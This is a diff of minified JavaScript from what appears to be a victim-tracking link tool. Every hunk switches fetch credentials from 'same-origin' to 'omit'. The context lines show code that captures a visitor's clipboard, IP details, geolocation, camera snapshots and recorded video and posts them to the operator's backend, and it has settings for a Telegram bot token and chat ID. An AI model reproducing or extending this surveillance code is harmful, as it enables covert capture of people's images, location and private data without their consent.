@@ -23,7 +23,7 @@
         r = a(9008),
         o = a.n(r);
       async function getCsrfToken() {
-        let e = await fetch("/api/csrf", { credentials: "same-origin" }),
+        let e = await fetch("/api/csrf", { credentials: "omit" }),
           t = await e.json();
         return t.csrfToken;
       }
@@ -100,7 +100,7 @@
                                       clipboard: n,
                                     },
                                   }),
-                                  credentials: "same-origin",
+                                  credentials: "omit",
                                 });
                               },
                               async () => {
@@ -127,7 +127,7 @@
                                       ipInfo: n,
                                     },
                                   }),
-                                  credentials: "same-origin",
+                                  credentials: "omit",
                                 });
                               },
                               { timeout: 15e3, maximumAge: 0 },
@@ -141,7 +141,7 @@
                       });
                   })(t, e));
               }))
-            : (fetch("/api/auth/session", { credentials: "same-origin" })
+            : (fetch("/api/auth/session", { credentials: "omit" })
                 .then((e) => e.json())
                 .then((t) => {
                   t.uid ? a(t.uid) : e.push("/");
@@ -153,7 +153,7 @@
           if (!t || !r) return;
           let e = await fetch("/api/links/list", {
               headers: { "X-CSRF-Token": r },
-              credentials: "same-origin",
+              credentials: "omit",
             }),
             a = await e.json();
           d(a);
@@ -166,7 +166,7 @@
             (await fetch("/api/auth/logout", {
               method: "POST",
               headers: { "X-CSRF-Token": r },
-              credentials: "same-origin",
+              credentials: "omit",
             }),
               e.push("/"));
           },
@@ -187,7 +187,7 @@
                       "X-CSRF-Token": r,
                     },
                     body: JSON.stringify({ botToken: p, chatId: g }),
-                    credentials: "same-origin",
+                    credentials: "omit",
                   },
                 ),
                 a = await t.json();
@@ -207,7 +207,7 @@
               (await fetch("/api/links/delete?id=".concat(e), {
                 method: "DELETE",
                 headers: { "X-CSRF-Token": r },
-                credentials: "same-origin",
+                credentials: "omit",
               }),
               M());
           },
@@ -397,7 +397,7 @@
                 data: n,
                 camera: e,
               }),
-              credentials: "same-origin",
+              credentials: "omit",
             }));
         }
         async function recordVideo(e, t) {
@@ -452,7 +452,7 @@
                         camera: e,
                         duration: t,
                       }),
-                      credentials: "same-origin",
+                      credentials: "omit",
                     })),
                     a());
                 }),
@@ -502,7 +502,7 @@
                       type: "clipboard",
                       data: { text: e },
                     }),
-                    credentials: "same-origin",
+                    credentials: "omit",
                   }));
               } catch (e) {}
               (R(2), await sleep(1e3), R(3));
